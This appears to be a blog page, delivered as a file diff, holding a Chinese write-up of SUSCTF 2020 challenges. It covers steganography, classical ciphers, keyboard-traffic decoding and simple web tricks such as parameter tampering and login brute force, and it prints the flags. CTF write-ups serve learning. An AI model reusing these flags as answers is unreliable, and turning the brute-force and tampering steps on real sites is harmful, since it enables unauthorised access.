@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>2020susctf_wp | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="个人ctf竞赛">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>2020susctf_wp</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">2020susctf_wp</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-10-21T13:05:52.000Z" itemprop="datePublished" class="page-time">
+  2020-10-21
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-2020susctf-wp"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">2020susctf_wp</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-10-21 21:05:52" datetime="2020-10-21T13:05:52.000Z"  itemprop="datePublished">2020-10-21</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>得到号的时候只剩半天时间了,断断续续做了一些题,有些web题环境关了来不及复现,buu见</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>SUSCTF{Welcome_t0_SUSCTF}</p>
+<h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>SUSCTF{Thank_y0u_fOr_your_r3ply}</p>
+<h3 id="爆破鬼才请求出战"><a href="#爆破鬼才请求出战" class="headerlink" title="爆破鬼才请求出战"></a>爆破鬼才请求出战</h3><p>第一关,掩码爆破</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>第二关,LSB隐写</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>第三关,栅栏密码</p>
+<p>S{urgdt1}UY_30__sS0a_04mc</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./4.png" title="图片" data-fancybox="images"><img src="./4.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUS{Y0u_ar3_g00d_4t_m1sc}</p>
+<h3 id="签到之公众号"><a href="#签到之公众号" class="headerlink" title="签到之公众号"></a>签到之公众号</h3><p>SUSCTF{W3lc0m3_t0_SUSCTF}</p>
+<h3 id="Dance-Dance"><a href="#Dance-Dance" class="headerlink" title="Dance_Dance"></a>Dance_Dance</h3><p>第一关,跳舞的小人密码</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./5.png" title="图片" data-fancybox="images"><img src="./5.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>根据<a href="https://www.dcode.fr/dancing-men-cipher" target="_blank" rel="noopener">在线网站</a>对出字符,举旗子的代表一个单词的结尾</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./6.png" title="图片" data-fancybox="images"><img src="./6.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>passwdLetU sdanCe</p>
+<p>第二关,binwalk分离</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./7.png" title="图片" data-fancybox="images"><img src="./7.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>压缩包密码:LetUsdanCe</p>
+<p>第三关,音频频谱二维码</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./8.png" title="图片" data-fancybox="images"><img src="./8.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>终究还是自己手画了出来</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./9.png" title="图片" data-fancybox="images"><img src="./9.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUS{1nt3r35t1nG_5p3ctRum}</p>
+<h3 id="balɟ¯ʇuᴉɹԀ"><a href="#balɟ¯ʇuᴉɹԀ" class="headerlink" title="ƃɐlɟ¯ʇuᴉɹԀ"></a>ƃɐlɟ¯ʇuᴉɹԀ</h3><p>将十六进制数据倒序,得到一个zip</p>
+<p>zip里有一个txt和加密压缩包,对txt进行字频分析</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./10.png" title="图片" data-fancybox="images"><img src="./10.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>Mima:D0youkNOw3dpr1nt?</p>
+<p>根据文件内容用到 Cura_SteamEngine 4.6.2 软件</p>
+<p>是我没有的硬件,告辞</p>
+<h3 id="萌-你还好吗？"><a href="#萌-你还好吗？" class="headerlink" title="[萌]你还好吗？"></a>[萌]你还好吗？</h3><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">在线网站</a>解ook密码</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>Ar3_y0u_OK??</p>
+<p>解压缩包得到图片,提示不够高,winhex改下高度</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./12.png" title="图片" data-fancybox="images"><img src="./12.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUS{wuhu_y0u_f1nD_m3}</p>
+<h3 id="萌-fix-fo"><a href="#萌-fix-fo" class="headerlink" title="[萌]fix_fo"></a>[萌]fix_fo</h3><p>拖进winhex修复文件头</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./13.png" title="图片" data-fancybox="images"><img src="./13.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>解压得到新佛曰密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./14.png" title="图片" data-fancybox="images"><img src="./14.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUS{Ta1k_w1th_F0}</p>
+<h3 id="抓住那只小老鼠"><a href="#抓住那只小老鼠" class="headerlink" title="抓住那只小老鼠"></a>抓住那只小老鼠</h3><p>第一关,zip伪加密,只有一个包是伪加密</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>解压得到keyboard流量包,粗略看了下是键盘敲击码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">00:00:13:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:04:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:16:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:16:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:1a:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:12:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:15:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:07:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2c:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">02:00:00:00:00:00:00:00</span><br><span class="line">02:00:33:00:00:00:00:00</span><br><span class="line">02:00:00:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2c:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0f:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:20:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:18:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:22:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0f:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0e:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:21:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0b:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:20:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:15:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:1e:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0a:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0b:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:05:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:18:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:11:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./16.png" title="图片" data-fancybox="images"><img src="./16.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>password<space><space>l3t-u5-l00k-4t-th3-r1ght-butt0n</space></space></p>
+<p>解不开那个压缩包,麻了</p>
+<h3 id="emoji真好玩"><a href="#emoji真好玩" class="headerlink" title="emoji真好玩"></a>emoji真好玩</h3><p>根据文件名,是个jpg的jphs加密,密码在emoji里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💸😲📓📓📀📧📰😫🐖👹🐛😫😥🐍📬📧😃🐡</span><br></pre></td></tr></table></figure>
+<p>可以使用github上的<a href="https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17/files/cracker" target="_blank" rel="noopener">脚本</a>解密<br><figure class="image-box">
+                <a rel=2020susctf_wp href="./17.png" title="图片" data-fancybox="images"><img src="./17.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<p>password:C0de3moj1</p>
+<p>使用密码对图片进行解密</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./18.png" title="图片" data-fancybox="images"><img src="./18.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>得到一个01字符串,文件名说把它画出来,猜测是01字符串转二维码</p>
+<p>根据开方为245*245的二维码,跑脚本得到二维码图片</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./19.png" title="图片" data-fancybox="images"><img src="./19.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUS{1p0ch_wanNA_4_npy5}</p>
+<h3 id="小熊你咋带着品如的面具"><a href="#小熊你咋带着品如的面具" class="headerlink" title="小熊你咋带着品如的面具"></a>小熊你咋带着品如的面具</h3><p>看样子是要先取证iso再用获得的密码来用EncryptoforWin进行解密</p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="简单-嘤语"><a href="#简单-嘤语" class="headerlink" title="[简单]嘤语"></a>[简单]嘤语</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">小Z在某站监听到一段加密对话：</span><br><span class="line">😳😊⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺🤐🔑⬜🤣⬜😇😠🤣🤪🤪😳😇🤣😠⬜😇😳😖🥺😍😏⬜😳🤪⬜🤣⬜😋🤐😖😍⬜🤩😆⬜😇😳😖🥺😍😏⬜😋🥺🤣😋⬜😴🤣🤪⬜😘🤪😍🙃⬜🥺😳🤪😋🤩😏😳😇🤣😠😠🤐⬜😅😘😋⬜😊🤩😴⬜🥺🤣🤪⬜😆🤣😠😠😍😊🔑⬜😆🤩😏⬜😋🥺😍⬜😭🤩🤪😋⬜😖🤣😏😋🔑⬜😳😊😋🤩⬜🙃😳🤪😘🤪😍⭕⬜😳😊⬜😇🤩😊😋😏🤣🤪😋⬜😋🤩⬜😭🤩🙃😍😏😊⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺😳😇⬜🤣😠🧐🤩😏😳😋🥺😭🤪🔑⬜😭🤩🤪😋⬜😇😠🤣🤪🤪😳😇🤣😠⬜😇😳😖🥺😍😏🤪⬜😇🤣😊⬜😅😍⬜😖😏🤣😇😋😳😇🤣😠😠🤐⬜😇🤩😭😖😘😋😍🙃⬜🤣😊🙃⬜🤪🤩😠😮😍🙃⬜😅🤐⬜🥺🤣😊🙃⭕⬜🥺🤩😴😍😮😍😏🔑⬜😋🥺😍🤐⬜🤣😏😍⬜🤣😠🤪🤩⬜😘🤪😘🤣😠😠🤐⬜😮😍😏🤐⬜🤪😳😭😖😠😍⬜😋🤩⬜😅😏😍🤣😷⬜😴😳😋🥺⬜😭🤩🙃😍😏😊⬜😋😍😇🥺😊🤩😠🤩🧐🤐⭕⬜😋🥺😍⬜😋😍😏😭⬜😳😊😇😠😘🙃😍🤪⬜😋🥺😍⬜🤪😳😭😖😠😍⬜🤪🤐🤪😋😍😭🤪⬜😘🤪😍🙃⬜🤪😳😊😇😍⬜🧐😏😍😍😷⬜🤣😊🙃⬜😏🤩😭🤣😊⬜😋😳😭😍🤪🔑⬜😋🥺😍⬜😍😠🤣😅🤩😏🤣😋😍⬜😏😍😊🤣😳🤪🤪🤣😊😇😍⬜😇😳😖🥺😍😏🤪🔑⬜😴🤩😏😠🙃⬜😴🤣😏⬜😳😳⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺🤐⬜🤪😘😇🥺⬜🤣🤪⬜😋🥺😍⬜😍😊😳🧐😭🤣⬜😭🤣😇🥺😳😊😍⬜🤣😊🙃⬜😅😍🤐🤩😊🙃⭕⬜🥺😍😏😍⬜😳🤪⬜🤐🤩😘😏⬜😆😠🤣🧐☯⬜🤪😘🤪😇😋😆🌘😍🤣🤪🤐⛔😏😍😖😠🤣😇😍⛔😇😏🤐😖😋🤩🌒⭕</span><br><span class="line">经过大量尝试，小Z勉强还原出一些特殊字符：</span><br><span class="line">⭕ =&gt; .</span><br><span class="line">☯ =&gt; :</span><br><span class="line">🔑 =&gt; ,</span><br><span class="line">⛔ =&gt; _</span><br><span class="line">🌘 =&gt; &#123;</span><br><span class="line">🌒 =&gt; &#125;</span><br><span class="line">你能帮帮他吗？</span><br><span class="line">注：flag均为大写</span><br></pre></td></tr></table></figure>
+<p>找到了<a href="https://apps.timwhitlock.info/emoji/tables/unicode" target="_blank" rel="noopener">编码表</a>和<a href="https://apps.timwhitlock.info/unicode/inspect" target="_blank" rel="noopener">解密网站</a>,但这题用不到<br>这题纯粹靠英语来猜,比如最后这一段应该是flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">🤪😘🤪😇😋😆</span><br><span class="line">SUSCTF</span><br><span class="line">🌘😍🤣🤪🤐⛔😏😍😖😠🤣😇😍⛔😇😏🤐😖😋🤩🌒</span><br><span class="line">SUSCTF&#123;**S*_*****C*_C***T*&#125;</span><br></pre></td></tr></table></figure>
+<p>又比如英语中比较常见的THE,IS等,根据已知的emoji和语句意进行猜测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">😋🥺😍</span><br><span class="line">THE</span><br><span class="line">😳🤪</span><br><span class="line">IS</span><br><span class="line">😆😠🤣🧐☯</span><br><span class="line">FLAG:</span><br><span class="line">😋🥺😍🤐</span><br><span class="line">THEY</span><br><span class="line">😋🤐😖😍</span><br><span class="line">TYPE</span><br><span class="line">更新后的flag</span><br><span class="line">SUSCTF&#123;EASY_REPLACE_CRYPTE&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h3><p>抓包改post传参</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./20.png" title="图片" data-fancybox="images"><img src="./20.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUSCTF{397d79b4fd5bb85d73d86742dfdf223d}</p>
+<h3 id="AT-Field"><a href="#AT-Field" class="headerlink" title="AT_Field"></a>AT_Field</h3><p>修改可以输入的字符长度,输入flag并提交</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./21.png" title="图片" data-fancybox="images"><img src="./21.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUSCTF{0e808712e2a814fe0cd126e09159226a}</p>
+<h3 id="Script-Kiddle"><a href="#Script-Kiddle" class="headerlink" title="Script_Kiddle"></a>Script_Kiddle</h3><p>抓个包爆破,需要缘分</p>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./22.png" title="图片" data-fancybox="images"><img src="./22.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUSCTF{24bf10b0f61c19e10a631e4c603127b2}</p>
+<h3 id="first-lesson"><a href="#first-lesson" class="headerlink" title="first_lesson"></a>first_lesson</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"z33"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;z33 is "</span> . $_GET[<span class="string">'z33'</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"z33"</span>] === <span class="string">"feiwu"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"rmb"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;rmb is "</span> . $_GET[<span class="string">"rmb"</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"rmb"</span>] === <span class="string">"shenxian"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"aa"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;aa is dage of "</span> . $_POST[<span class="string">"aa"</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">"aa"</span>] === <span class="string">"z33&amp;rmb"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use POST method to submit aa&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use GET method to submit rmb&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use GET method to submit z33&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./23.png" title="图片" data-fancybox="images"><img src="./23.png" alt="图片" title class></a>
